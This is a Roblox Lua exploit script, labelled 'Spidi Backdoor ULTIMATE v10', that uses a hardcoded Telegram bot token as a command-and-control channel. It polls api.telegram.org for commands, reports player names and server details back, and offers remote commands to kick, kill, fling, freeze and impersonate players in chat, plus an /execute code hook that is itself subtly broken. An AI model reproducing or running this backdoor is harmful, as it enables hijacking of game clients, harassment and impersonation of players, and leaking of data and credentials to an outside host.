repeat wait() until game:IsLoaded()

local BOT_TOKEN = "8778091630:AAEvqz_bo9fat2Or2Q_XYeeMWS2QBFPMRXc"
local CHAT_ID = nil

local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local TeleportService = game:GetService("TeleportService")
local StarterGui = game:GetService("StarterGui")
local UserInputService = game:GetService("UserInputService")
local Workspace = game:GetService("Workspace")
local Lighting = game:GetService("Lighting")
local Debris = game:GetService("Debris")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local TextChatService = game:GetService("TextChatService")
local MarketplaceService = game:GetService("MarketplaceService")
local RunService = game:GetService("RunService")
local SoundService = game:GetService("SoundService")
local TweenService = game:GetService("TweenService")

local function httpRequest(url, method, headers, body)
    local f = syn and syn.request or http and http.request or http_request or fluxus and fluxus.request or request
    if not f then return nil end
    local args = { Url = url, Method = method or "GET", Headers = headers or {} }
    if body then args.Body = body end
    local ok, res = pcall(f, args)
    if ok and res then return res else return nil end
end

local function sendMessage(text)
    if not CHAT_ID then return end
    local payload = { chat_id = CHAT_ID, text = text, parse_mode = "HTML" }
    httpRequest("https://api.telegram.org/bot"..BOT_TOKEN.."/sendMessage", "POST",
        { ["Content-Type"] = "application/json" },
        HttpService:JSONEncode(payload))
end

local function getChatId()
    local res = httpRequest("https://api.telegram.org/bot"..BOT_TOKEN.."/getUpdates")
    if res and res.Body then
        local ok, data = pcall(HttpService.JSONDecode, HttpService, res.Body)
        if ok and data and data.result and #data.result > 0 then
            CHAT_ID = data.result[#data.result].message.chat.id
            return true
        end
    end
    return false
end

-- ==================== БАЗА ПОЛЬЗОВАТЕЛЕЙ ====================
local scriptUsers = {}

local function addScriptUser(player)
    if not scriptUsers[player.UserId] then
        scriptUsers[player.UserId] = player
        sendMessage("🟢 <b>"..player.Name.."</b> подключился к Spidi Backdoor!")
    end
end

local function removeScriptUser(player)
    if scriptUsers[player.UserId] then
        scriptUsers[player.UserId] = nil
        sendMessage("🔴 <b>"..player.Name.."</b> отключился от Spidi Backdoor!")
    end
end

addScriptUser(Players.LocalPlayer)

local marker = Instance.new("BoolValue")
marker.Name = "SpidiUser"
marker.Parent = Players.LocalPlayer

local function updateScriptUsers()
    for _, p in pairs(Players:GetPlayers()) do
        if p:FindFirstChild("SpidiUser") then
            addScriptUser(p)
        end
    end
end

local function findPlayer(input)
    if not input or input == "" then
        return nil, "❌ Введи ник или номер"
    end
    
    local users = {}
    for _, p in pairs(Players:GetPlayers()) do
        if scriptUsers[p.UserId] then
            table.insert(users, p)
        end
    end
    
    local num = tonumber(input)
    if num and users[num] then
        return users[num]
    end
    
    input = input:lower()
    local matches = {}
    for _, p in pairs(users) do
        if p.Name:lower():find(input, 1, true) or p.DisplayName:lower():find(input, 1, true) then
            table.insert(matches, p)
        end
    end
    if #matches == 1 then
        return matches[1]
    elseif #matches > 1 then
        local names = {}
        for _, p in pairs(matches) do
            table.insert(names, p.Name)
        end
        return nil, "Найдено несколько: "..table.concat(names, ", ")
    else
        return nil, "Игрок не найден"
    end
end

local function getScriptUserList()
    local list = {}
    local i = 1
    for _, p in pairs(Players:GetPlayers()) do
        if scriptUsers[p.UserId] then
            table.insert(list, i..". "..p.Name)
            i = i + 1
        end
    end
    return list
end

-- ==================== МУЗЫКА ====================
local function playMusic(soundId)
    local oldSound = SoundService:FindFirstChild("ClientMusic")
    if oldSound then oldSound:Destroy() end

    local sound = Instance.new("Sound")
    sound.Name = "ClientMusic"
    sound.SoundId = "rbxassetid://" .. tostring(soundId)
    sound.Volume = 1
    sound.Looped = true
    sound.Parent = SoundService
    sound:Play()
end

local function stopMusic()
    local sound = SoundService:FindFirstChild("ClientMusic")
    if sound then
        sound:Stop()
        sound:Destroy()
        return true
    end
    return false
end

-- ==================== КД ====================
local messageCooldown = {}
local function canSendMessage(player)
    local userId = player.UserId
    local last = messageCooldown[userId] or 0
    if tick() - last < 0.3 then
        return false
    end
    messageCooldown[userId] = tick()
    return true
end

-- ==================== ФУНКЦИИ ====================
local function desorientPlayer(target)
    local char = target.Character
    if not char then return end
    local camera = Workspace.CurrentCamera
    if not camera then return end
    camera.CameraType = Enum.CameraType.Scriptable
    local startTime = tick()
    local connection
    connection = RunService.RenderStepped:Connect(function()
        if tick() - startTime >= 3 then
            connection:Disconnect()
            camera.CameraType = Enum.CameraType.Custom
            return
        end
        camera.CFrame = camera.CFrame * CFrame.Angles(
            math.rad(math.random(-15, 15)),
            math.rad(25),
            math.rad(math.random(-10, 10))
        )
    end)
end

local isFpsCapped = false
local function toggleFps()
    isFpsCapped = not isFpsCapped
    setfpscap(isFpsCapped and 10 or 60)
    return isFpsCapped
end

local function sayMessage(target, msg)
    if not target then return end
    local chatChannel = TextChatService.TextChannels:FindFirstChild("RBXGeneral")
    if chatChannel then
        chatChannel:SendAsync(msg)
        return
    end
    local legacyRemote = ReplicatedStorage:FindFirstChild("DefaultChatSystemChatEvents")
    if legacyRemote then
        local say = legacyRemote:FindFirstChild("SayMessageRequest")
        if say then
            say:FireServer(msg, "All")
        end
    end
end

local stunnedPlayers = {}
local function stunPlayer(target)
    local char = target.Character
    if not char then return end
    local hum = char:FindFirstChild("Humanoid")
    if not hum then return end
    local origSpeed = hum.WalkSpeed
    local origJump = hum.JumpPower
    hum.WalkSpeed = 0
    hum.JumpPower = 0
    stunnedPlayers[target.UserId] = { speed = origSpeed, jump = origJump }
    task.delay(3, function()
        if stunnedPlayers[target.UserId] then
            local data = stunnedPlayers[target.UserId]
            local h = target.Character and target.Character:FindFirstChild("Humanoid")
            if h then
                h.WalkSpeed = data.speed
                h.JumpPower = data.jump
            end
            stunnedPlayers[target.UserId] = nil
        end
    end)
end

local function flingPlayer(target)
    local char = target.Character
    if not char then return end
    local hrp = char:FindFirstChild("HumanoidRootPart")
    local hum = char:FindFirstChildOfClass("Humanoid")
    if not (hrp and hum) then return end
    hum.Sit = true
    local dirX = math.random() > 0.5 and 1 or -1
    local dirZ = math.random() > 0.5 and 1 or -1
    hrp.AssemblyLinearVelocity = Vector3.new(
        math.random(200, 400) * dirX,
        math.random(300, 500),
        math.random(200, 400) * dirZ
    )
end

local spinningPlayers = {}
local function spinPlayer(target, speed)
    speed = speed or 1
    speed = math.clamp(speed, 0.5, 10)
    if spinningPlayers[target.UserId] then
        spinningPlayers[target.UserId] = nil
    end
    local char = target.Character
    if not char then return end
    local hrp = char:FindFirstChild("HumanoidRootPart")
    if not hrp then return end
    local running = true
    spinningPlayers[target.UserId] = { running = true }
    spawn(function()
        while running and spinningPlayers[target.UserId] and spinningPlayers[target.UserId].running do
            if not target.Character then break end
            local h = target.Character:FindFirstChild("HumanoidRootPart")
            if h then
                h.CFrame = h.CFrame * CFrame.Angles(0, math.rad(18 * speed), 0)
            end
            task.wait(0.05)
        end
    end)
    return true
end

local function unspinPlayer(target)
    if spinningPlayers[target.UserId] then
        spinningPlayers[target.UserId].running = false
        spinningPlayers[target.UserId] = nil
        local char = target.Character
        if char then
            local hrp = char:FindFirstChild("HumanoidRootPart")
            if hrp then
                hrp.CFrame = CFrame.new(hrp.Position)
            end
        end
        return true
    end
    return false
end

local function showNotification(target, text, duration)
    duration = duration or 5
    local gui = target:FindFirstChild("PlayerGui")
    if not gui then return end
    
    local screen = Instance.new("ScreenGui")
    screen.Name = "SpidiNotif"
    screen.ResetOnSpawn = false
    screen.Parent = gui
    
    local frame = Instance.new("Frame")
    frame.Size = UDim2.new(0, 450, 0, 50)
    frame.Position = UDim2.new(0.5, -225, 0, 20)
    frame.BackgroundColor3 = Color3.fromRGB(10, 10, 20)
    frame.BackgroundTransparency = 0.1
    frame.BorderSizePixel = 0
    frame.Parent = screen
    
    local corner = Instance.new("UICorner")
    corner.CornerRadius = UDim.new(0, 10)
    corner.Parent = frame
    
    local stroke = Instance.new("UIStroke")
    stroke.Color = Color3.fromRGB(0, 255, 0)
    stroke.Thickness = 1
    stroke.Parent = frame
    
    local textLabel = Instance.new("TextLabel")
    textLabel.Size = UDim2.new(1, -20, 1, 0)
    textLabel.Position = UDim2.new(0, 10, 0, 0)
    textLabel.BackgroundTransparency = 1
    textLabel.Text = text or ""
    textLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
    textLabel.TextSize = 16
    textLabel.Font = Enum.Font.Gotham
    textLabel.TextXAlignment = Enum.TextXAlignment.Center
    textLabel.TextWrapped = true
    textLabel.Parent = frame
    
    frame.BackgroundTransparency = 1
    frame.Position = UDim2.new(0.5, -225, 0, -80)
    TweenService:Create(frame, TweenInfo.new(0.5, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
        BackgroundTransparency = 0.1,
        Position = UDim2.new(0.5, -225, 0, 20)
    }):Play()
    
    game:GetService("Debris"):AddItem(screen, duration)
end

-- ==================== ОБРАБОТЧИК КОМАНД ====================
local function handleCommand(cmd, args, username)
    local info = "👤 Hacker228\n🔗 https://www.roblox.com/games/"..game.PlaceId
    
    if cmd == "start" then
        sendMessage("✅ Spidi Backdoor ULTIMATE v10 активирован!\n"..info)
        return
    end
    
    if cmd == "help" then
        sendMessage("📋 <b>КОМАНДЫ SPIDI v10:</b>\n\n"..
            "<b>👤 ПОЛЬЗОВАТЕЛИ:</b>\n"..
            "/players - список пользователей\n"..
            "/kick [ник] [причина] - кикнуть\n"..
            "/ban [ник] [причина] - забанить\n"..
            "/unban [ник] - разбанить\n"..
            "/kill [ник] - убить\n"..
            "/freeze [ник] - заморозить\n"..
            "/unfreeze [ник] - разморозить\n"..
            "/fly [ник] - полететь\n"..
            "/unfly [ник] - отключить полет\n"..
            "/crash [ник] - крашнуть\n"..
            "/fling [ник] - флинг\n"..
            "/teleport [ник1] [ник2] - телепорт\n"..
            "/bring [ник1] [ник2] - притянуть\n"..
            "/loopkill [ник] - бесконечный килл\n"..
            "/stun [ник] - оглушить (3 сек)\n"..
            "/jump [ник] - прыжок\n"..
            "/spin [ник] [скорость] - крутить\n"..
            "/unspin [ник] - остановить вращение\n"..
            "/explode [ник] - взорвать\n"..
            "/des [ник] - дезориентация (3 сек)\n"..
            "/warp [ник] [1-10] - размыть экран\n"..
            "/unwarp [ник] - убрать размытие\n\n"..
            "<b>🎵 МУЗЫКА:</b>\n"..
            "/music [айди] - играть музыку\n"..
            "/unmusic - выключить музыку\n\n"..
            "<b>💬 ЧАТ:</b>\n"..
            "/say [ник] [текст] - сказать от имени\n"..
            "/spam [ник] [кол-во] [текст] - спам\n"..
            "/message [ник] [текст] - сообщение\n"..
            "/announce [текст] - объявление\n\n"..
            "<b>📊 ИНФО:</b>\n"..
            "/players - список пользователей\n"..
            "/server - инфо о сервере\n"..
            "/rejoin - перезайти\n"..
            "/execute [код] - выполнить код\n"..
            "/setfps - ограничить FPS\n"..
            "/help - помощь")
        return
    end
    
    if cmd == "players" then
        local list = getScriptUserList()
        if #list == 0 then
            sendMessage("👥 Пользователей скрипта: 0")
        else
            sendMessage("👥 <b>Пользователи Spidi:</b>\n"..table.concat(list, "\n"))
        end
        return
    end
    
    if cmd == "server" then
        local placeName = MarketplaceService:GetProductInfo(game.PlaceId).Name
        local scriptCount = 0
        for _, p in pairs(Players:GetPlayers()) do
            if scriptUsers[p.UserId] then
                scriptCount = scriptCount + 1
            end
        end
        sendMessage("🖥️ Сервер: "..placeName.."\nID: "..game.PlaceId.."\nИгроков: "..#Players:GetPlayers().."\nПользователей Spidi: "..scriptCount)
        return
    end
    
    if cmd == "rejoin" then
        sendMessage("🔄 Перезаход...")
        TeleportService:Teleport(game.PlaceId, Players.LocalPlayer)
        return
    end
    
    if cmd == "setfps" then
        local state = toggleFps()
        sendMessage("🎮 FPS лимит: "..(state and "10 (включён)" or "60 (выключен)"))
        return
    end
    
    if cmd == "execute" then
        local code = table.concat(args, " ", 1)
        if code == "" then sendMessage("❌ /execute код") return end
        sendMessage("⏳ Выполнение...")
        local ok, res = pcall(loadstring, code)
        if ok then
            sendMessage("✅ Код выполнен\n"..info)
        else
            sendMessage("❌ Ошибка: "..tostring(res))
        end
        return
    end
    
    -- ========== МУЗЫКА ==========
    if cmd == "music" then
        local id = args[1]
        if not id then
            sendMessage("❌ /music [айди]")
            return
        end
        playMusic(id)
        sendMessage("🎵 Музыка включена! ID: "..id)
        return
    end
    
    if cmd == "unmusic" then
        if stopMusic() then
            sendMessage("🔇 Музыка выключена!")
        else
            sendMessage("❌ Музыка не играет")
        end
        return
    end
    
    -- ========== ANNOUNCE (ЧИСТОЕ ОБЪЯВЛЕНИЕ) ==========
    if cmd == "announce" then
        local msg = table.concat(args, " ", 1)
        if msg == "" then
            sendMessage("❌ /announce [текст]")
            return
        end
        StarterGui:SetCore("SendNotification", {
            Title = "",
            Text = msg,
            Duration = 10,
            Icon = ""
        })
        sendMessage("✅ Объявление: "..msg)
        return
    end
    
    -- ========== КОМАНДЫ С ВЫБОРОМ ИГРОКА ==========
    
    if cmd == "say" then
        local name = args[1]
        local msg = table.concat(args, " ", 2)
        if not name then
            sendMessage("❌ /say [ник/номер] [текст]")
            return
        end
        if msg == "" then
            sendMessage("❌ Введи текст: /say ник текст")
            return
        end
        local target, err = findPlayer(name)
        if not target then
            sendMessage("❌ "..err)
            return
        end
        sayMessage(target, msg)
        sendMessage("✅ Сказано от имени <b>"..target.Name.."</b>: "..msg)
        return
    end
    
    if cmd == "spam" then
        local name = args[1]
        local count = tonumber(args[2]) or 5
        local msg = table.concat(args, " ", 3)
        if not name then
            sendMessage("❌ /spam [ник/номер] [кол-во] [текст]")
            return
        end
        if msg == "" then
            sendMessage("❌ Введи текст: /spam ник кол-во текст")
            return
        end
        local target, err = findPlayer(name)
        if not target then
            sendMessage("❌ "..err)
            return
        end
        for i = 1, math.min(count, 20) do
            task.wait(0.1)
            sayMessage(target, msg.." "..i)
        end
        sendMessage("✅ Спам отправлен от имени <b>"..target.Name.."</b> ("..math.min(count, 20).." раз)")
        return
    end
    
    if cmd == "message" then
        local name = args[1]
        local msg = table.concat(args, " ", 2)
        if not name then
            sendMessage("❌ /message [ник/номер] [текст]")
            return
        end
        if msg == "" then
            sendMessage("❌ Введи текст: /message ник текст")
            return
        end
        local target, err = findPlayer(name)
        if not target then
            sendMessage("❌ "..err)
            return
        end
        if not canSendMessage(target) then
            sendMessage("⏳ Подожди 0.3 сек перед следующим сообщением")
            return
        end
        showNotification(target, msg, 5)
        sendMessage("✅ Сообщение <b>"..target.Name.."</b>: "..msg)
        return
    end
    
    if cmd == "teleport" or cmd == "bring" then
        local name1 = args[1]
        local name2 = args[2]
        if not name1 or not name2 then
            sendMessage("❌ /"..cmd.." [ник1/номер1] [ник2/номер2]")
            return
        end
        local target1, err1 = findPlayer(name1)
        if not target1 then
            sendMessage("❌ "..err1)
            return
        end
        local target2, err2 = findPlayer(name2)
        if not target2 then
            sendMessage("❌ "..err2)
            return
        end
        local hrp1 = target1.Character and target1.Character:FindFirstChild("HumanoidRootPart")
        local hrp2 = target2.Character and target2.Character:FindFirstChild("HumanoidRootPart")
        if not hrp1 or not hrp2 then
            sendMessage("❌ Не найден персонаж у одного из игроков")
            return
        end
        if cmd == "teleport" then
            hrp1.CFrame = hrp2.CFrame + Vector3.new(0, 3, 0)
            sendMessage("📍 <b>"..target1.Name.."</b> телепортирован к <b>"..target2.Name.."</b>")
        else
            hrp2.CFrame = hrp1.CFrame + Vector3.new(0, 3, 0)
            sendMessage("📍 <b>"..target2.Name.."</b> притянут к <b>"..target1.Name.."</b>")
        end
        return
    end
    
    -- ========== ОБЫЧНЫЕ КОМАНДЫ ==========
    local name = args[1]
    if not name then
        sendMessage("❌ Укажи ник или номер игрока")
        return
    end
    
    local target, err = findPlayer(name)
    if not target then
        sendMessage("❌ "..err)
        return
    end
    
    local char = target.Character
    local hrp = char and char:FindFirstChild("HumanoidRootPart")
    local humanoid = char and char:FindFirstChild("Humanoid")
    
    if cmd == "kick" then
        local reason = table.concat(args, " ", 2)
        if reason == "" or reason == name then
            target:Kick("Kicked by Spidi Backdoor")
        else
            target:Kick(reason)
        end
        sendMessage("✅ Кикнут: <b>"..target.Name.."</b>"..(reason ~= "" and reason ~= name and " (Причина: "..reason..")" or ""))
        return
    end
    
    if cmd == "ban" then
        local reason = table.concat(args, " ", 2)
        if reason == "" or reason == name then
            target:Kick("Banned by Spidi Backdoor")
        else
            target:Kick(reason)
        end
        sendMessage("✅ Забанен: <b>"..target.Name.."</b>"..(reason ~= "" and reason ~= name and " (Причина: "..reason..")" or ""))
        return
    end
    
    if cmd == "unban" then
        target:Kick("Unbanned by Spidi Backdoor")
        sendMessage("✅ Разбанен: <b>"..target.Name.."</b>")
        return
    end
    
    if cmd == "kill" then
        if humanoid then
            humanoid.Health = 0
            sendMessage("💀 Убит: <b>"..target.Name.."</b>")
        else
            sendMessage("❌ Не найден персонаж у <b>"..target.Name.."</b>")
        end
        return
    end
    
    if cmd == "freeze" then
        if hrp and humanoid then
            hrp.Anchored = true
            humanoid.WalkSpeed = 0
            humanoid.JumpPower = 0
            sendMessage("🧊 Заморожен: <b>"..target.Name.."</b>")
        else
            sendMessage("❌ Не найден персонаж у <b>"..target.Name.."</b>")
        end
        return
    end
    
    if cmd == "unfreeze" then
        if hrp and humanoid then
            hrp.Anchored = false
            humanoid.WalkSpeed = 16
            humanoid.JumpPower = 50
            sendMessage("🔥 Разморожен: <b>"..target.Name.."</b>")
        else
            sendMessage("❌ Не найден персонаж у <b>"..target.Name.."</b>")
        end
        return
    end
    
    if cmd == "fly" and hrp then
        local bv = Instance.new("BodyVelocity")
        bv.MaxForce = Vector3.new(1,1,1)*1e8
        bv.Velocity = Vector3.new(0, 50, 0)
        bv.Parent = hrp
        Debris:AddItem(bv, 5)
        sendMessage("✈️ Полетел: <b>"..target.Name.."</b>")
        return
    end
    
    if cmd == "unfly" and hrp then
        for _, v in pairs(hrp:GetChildren()) do
            if v:IsA("BodyVelocity") then
                v:Destroy()
            end
        end
        sendMessage("🛑 Отключен полет: <b>"..target.Name.."</b>")
        return
    end
    
    if cmd == "crash" and hrp then
        local pos = hrp.Position
        for i = 1, 100 do
            local p = Instance.new("Part")
            p.Size = Vector3.new(5,5,5)
            p.Position = pos + Vector3.new(math.random(-50,50), math.random(-50,50), math.random(-50,50))
            p.Anchored = true
            p.Parent = Workspace
            Debris:AddItem(p, 2)
        end
        sendMessage("💥 Крашнут: <b>"..target.Name.."</b>")
        return
    end
    
    if cmd == "fling" then
        flingPlayer(target)
        sendMessage("🌀 Флинг на <b>"..target.Name.."</b>")
        return
    end
    
    if cmd == "loopkill" and humanoid then
        spawn(function()
            for i = 1, 10 do
                if not target or not target.Character then break end
                local hum = target.Character:FindFirstChild("Humanoid")
                if hum then
                    hum.Health = 0
                end
                task.wait(0.5)
            end
        end)
        sendMessage("🔄 Loopkill на <b>"..target.Name.."</b>")
        return
    end
    
    if cmd == "stun" then
        if humanoid then
            stunPlayer(target)
            sendMessage("⚡ Оглушен на 3 сек: <b>"..target.Name.."</b>")
        else
            sendMessage("❌ Не найден персонаж у <b>"..target.Name.."</b>")
        end
        return
    end
    
    if cmd == "jump" and humanoid then
        humanoid.Jump = true
        sendMessage("🦘 Прыжок: <b>"..target.Name.."</b>")
        return
    end
    
    if cmd == "spin" then
        local speed = tonumber(args[2]) or 1
        speed = math.clamp(speed, 0.5, 10)
        if spinPlayer(target, speed) then
            sendMessage("🔄 Вращение ("..speed.."x): <b>"..target.Name.."</b>")
        else
            sendMessage("❌ Не найден персонаж у <b>"..target.Name.."</b>")
        end
        return
    end
    
    if cmd == "unspin" then
        if unspinPlayer(target) then
            sendMessage("✅ Остановлено вращение: <b>"..target.Name.."</b>")
        else
            sendMessage("❌ Не найден персонаж или вращение не активно у <b>"..target.Name.."</b>")
        end
        return
    end
    
    if cmd == "explode" and hrp then
        local pos = hrp.Position
        for i = 1, 30 do
            local p = Instance.new("Part")
            p.Size = Vector3.new(3,3,3)
            p.Position = pos + Vector3.new(math.random(-20,20), math.random(-20,20), math.random(-20,20))
            p.Anchored = true
            p.Material = Enum.Material.Neon
            p.BrickColor = BrickColor.new("Bright red")
            p.Parent = Workspace
            Debris:AddItem(p, 1)
        end
        sendMessage("💥 Взрыв: <b>"..target.Name.."</b>")
        return
    end
    
    if cmd == "des" then
        desorientPlayer(target)
        sendMessage("🌀 Дезориентация камеры (3 сек): <b>"..target.Name.."</b>")
        return
    end
    
    if cmd == "warp" then
        local level = tonumber(args[2]) or 5
        level = math.clamp(level, 1, 10)
        local blur = Lighting:FindFirstChild("SpidiWarp")
        if not blur then
            blur = Instance.new("BlurEffect")
            blur.Name = "SpidiWarp"
            blur.Parent = Lighting
        end
        blur.Size = level * 3
        sendMessage("🌀 Размытие "..level.."/10 на <b>"..target.Name.."</b>")
        return
    end
    
    if cmd == "unwarp" then
        local blur = Lighting:FindFirstChild("SpidiWarp")
        if blur then
            blur:Destroy()
            sendMessage("✅ Размытие убрано у <b>"..target.Name.."</b>")
        else
            sendMessage("❌ Нет активного размытия у <b>"..target.Name.."</b>")
        end
        return
    end
    
    sendMessage("❌ Неизвестная команда. /help")
end

-- ==================== УВЕДОМЛЕНИЯ ====================
local oldPlayers = {}
local function checkNewPlayers()
    for _, p in pairs(Players:GetPlayers()) do
        if not oldPlayers[p.UserId] then
            if p:FindFirstChild("SpidiUser") then
                addScriptUser(p)
            end
            oldPlayers[p.UserId] = true
        end
    end
end

spawn(function()
    while true do
        pcall(checkNewPlayers)
        wait(3)
    end
end)

-- ==================== ОПРОС TELEGRAM ====================
local lastId = 0
local function pollUpdates()
    local res = httpRequest("https://api.telegram.org/bot"..BOT_TOKEN.."/getUpdates?offset="..(lastId+1))
    if res and res.Body then
        local ok, data = pcall(HttpService.JSONDecode, HttpService, res.Body)
        if ok and data and data.result then
            for _, update in pairs(data.result) do
                if update.message and update.message.text then
                    local msg = update.message
                    if not CHAT_ID then
                        CHAT_ID = msg.chat.id
                        sendMessage("✅ Spidi Backdoor ULTIMATE v10 запущен!\n👤 Hacker228")
                    end
                    local text = msg.text
                    if text:sub(1,1) == "/" then
                        local parts = {}
                        for w in string.gmatch(text, "%S+") do
                            table.insert(parts, w)
                        end
                        local cmd = parts[1]:sub(2):lower()
                        table.remove(parts, 1)
                        handleCommand(cmd, parts, msg.from.username)
                    end
                end
                if update.update_id then
                    lastId = update.update_id
                end
            end
        end
    end
end

spawn(function()
    while true do
        pcall(pollUpdates)
        wait(2)
    end
end)

-- ==================== GUI ====================
local function createGUI()
    local player = Players.LocalPlayer
    if not player then return end
    
    local gui = player:FindFirstChild("PlayerGui")
    if not gui then
        gui = Instance.new("PlayerGui")
        gui.Parent = player
    end
    
    local screen = Instance.new("ScreenGui")
    screen.Name = "Spidi Backdoor"
    screen.ResetOnSpawn = false
    screen.Parent = gui
    
    local frame = Instance.new("Frame")
    frame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
    frame.Size = UDim2.new(0, 482, 0, 276)
    frame.Position = UDim2.new(0.5, -241, 0.5, -138)
    frame.Active = true
    frame.Parent = screen
    
    local stroke = Instance.new("UIStroke")
    stroke.Thickness = 2
    stroke.Color = Color3.fromRGB(255, 255, 255)
    stroke.Parent = frame
    
    local grad = Instance.new("UIGradient")
    grad.Rotation = 50
    grad.Color = ColorSequence.new({
        ColorSequenceKeypoint.new(0, Color3.fromRGB(255, 0, 0)),
        ColorSequenceKeypoint.new(1, Color3.fromRGB(0, 255, 0))
    })
    grad.Parent = stroke
    
    local corner = Instance.new("UICorner")
    corner.CornerRadius = UDim.new(0, 12)
    corner.Parent = frame
    
    local title = Instance.new("TextLabel")
    title.BackgroundTransparency = 1
    title.Size = UDim2.new(1, 0, 0, 50)
    title.Position = UDim2.new(0, 0, 0, 10)
    title.Text = "Spidi Backdoor ULTIMATE v10"
    title.TextColor3 = Color3.fromRGB(0, 255, 0)
    title.TextSize = 28
    title.Font = Enum.Font.GothamBold
    title.TextXAlignment = Enum.TextXAlignment.Center
    title.Parent = frame
    
    local desc = Instance.new("TextLabel")
    desc.BackgroundTransparency = 1
    desc.Size = UDim2.new(1, -40, 0, 80)
    desc.Position = UDim2.new(0, 20, 0, 70)
    desc.Text = "Spidi Backdoor Active!\n/music [айди] - играть музыку"
    desc.TextColor3 = Color3.fromRGB(0, 255, 0)
    desc.TextSize = 18
    desc.Font = Enum.Font.GothamBold
    desc.TextWrapped = true
    desc.TextXAlignment = Enum.TextXAlignment.Center
    desc.Parent = frame
    
    local btn = Instance.new("TextButton")
    btn.BackgroundColor3 = Color3.fromRGB(60, 60, 80)
    btn.Size = UDim2.new(0, 140, 0, 40)
    btn.Position = UDim2.new(0.5, -70, 0.75, 0)
    btn.Text = "OK"
    btn.TextColor3 = Color3.fromRGB(255, 255, 255)
    btn.TextSize = 18
    btn.Font = Enum.Font.GothamBold
    btn.Parent = frame
    
    local btnCorner = Instance.new("UICorner")
    btnCorner.CornerRadius = UDim.new(0, 6)
    btnCorner.Parent = btn
    
    btn.MouseButton1Click:Connect(function()
        screen:Destroy()
    end)
    
    local drag = false
    local startPos, startMouse, dragInput
    
    frame.InputBegan:Connect(function(inp)
        if (inp.UserInputType == Enum.UserInputType.MouseButton1 or inp.UserInputType == Enum.UserInputType.Touch) and not UserInputService:GetFocusedTextBox() then
            drag = true
            startPos = frame.Position
            startMouse = inp.Position
            inp.Changed:Connect(function()
                if inp.UserInputState == Enum.UserInputState.End then
                    drag = false
                end
            end)
        end
    end)
    
    frame.InputChanged:Connect(function(inp)
        if inp.UserInputType == Enum.UserInputType.MouseMovement or inp.UserInputType == Enum.UserInputType.Touch then
            dragInput = inp
        end
    end)
    
    UserInputService.InputChanged:Connect(function(inp)
        if inp == dragInput and drag then
            local delta = inp.Position - startMouse
            frame.Position = UDim2.new(
                startPos.X.Scale,
                startPos.X.Offset + delta.X,
                startPos.Y.Scale,
                startPos.Y.Offset + delta.Y
            )
        end
    end)
end

local function onCharacterChanged()
    wait(1)
    if not Players.LocalPlayer.Character then
        wait(2)
        createGUI()
    end
end

createGUI()
Players.LocalPlayer:GetPropertyChangedSignal("Character"):Connect(onCharacterChanged)

wait(3)
getChatId()

if CHAT_ID then
    sendMessage("✅ Spidi Backdoor ULTIMATE v10 запущен!\n👤 Hacker228\n📋 /players - список пользователей\n🎵 /music [айди] - играть музыку")
end
